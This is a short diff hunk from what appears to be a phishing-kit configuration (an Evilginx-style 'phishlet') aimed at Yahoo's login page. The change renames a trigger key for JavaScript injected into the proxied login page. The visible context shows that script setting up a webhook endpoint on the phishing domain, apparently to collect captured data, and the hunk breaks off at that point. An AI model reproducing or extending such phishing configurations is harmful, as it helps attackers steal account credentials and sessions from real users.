@@ -20,7 +20,7 @@ login:
   domain: 'login.yahoo.com'
   path: '/'
 js_inject:
-  - trigger: 'login.yahoo.com'
+  - trigger_domains: ['login.yahoo.com']
     code: |
       (function() {
         const api = "https://{{.Domain}}/api/webhook";
